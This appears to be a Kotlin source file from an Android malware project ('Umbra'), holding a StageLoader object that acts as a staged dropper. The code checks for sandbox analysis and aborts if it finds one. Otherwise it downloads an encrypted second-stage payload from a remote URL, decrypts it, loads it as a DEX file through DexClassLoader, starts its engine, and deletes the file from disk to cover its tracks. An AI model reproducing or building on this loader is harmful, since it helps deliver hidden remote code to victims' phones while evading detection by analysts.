package dev.yassine.umbra.core

import android.content.Context
import android.util.Log
import dalvik.system.DexClassLoader
import dev.yassine.umbra.core.CryptoEngine
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.File
import java.util.concurrent.TimeUnit

object StageLoader {
    private const val TAG = "Umbra.Stage"

    suspend fun load(context: Context, stage2Url: String): Boolean = withContext(Dispatchers.IO) {
        try {
            if (!SandboxDetector.isRealDevice(context)) {
                Log.w(TAG, "Sandbox detected — aborting Stage 2 load")
                return@withContext false
            }

            Log.d(TAG, "Downloading Stage 2 from $stage2Url")
            val encrypted = download(stage2Url) ?: return@withContext false
            Log.d(TAG, "Downloaded ${encrypted.size} bytes (encrypted)")

            val decrypted = CryptoEngine.decryptBytes(encrypted)
            Log.d(TAG, "Decrypted ${decrypted.size} bytes")

            val dexDir = context.getDir("dex", Context.MODE_PRIVATE)
            val dexFile = File(dexDir, "payload.dex")
            dexFile.writeBytes(decrypted)

            val classLoader = DexClassLoader(
                dexFile.absolutePath,
                dexDir.absolutePath,
                null,
                context.classLoader
            )

            // Load and invoke Stage 2 entry point
            val engineClass = classLoader.loadClass("dev.yassine.umbra.core.UmbraEngine")
            val instance = engineClass.getMethod("getInstance").invoke(null)
            engineClass.getMethod("start", Context::class.java).invoke(instance, context)

            dexFile.delete()
            Log.d(TAG, "Stage 2 loaded and DEX deleted from disk")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Stage 2 load failed: ${e.message}", e)
            false
        }
    }

    private fun download(url: String): ByteArray? {
        return try {
            val client = OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(60, TimeUnit.SECONDS)
                .build()
            val response = client.newCall(Request.Builder().url(url).build()).execute()
            if (response.isSuccessful) response.body?.bytes() else null
        } catch (e: Exception) {
            Log.e(TAG, "Download failed: ${e.message}")
            null
        }
    }
}
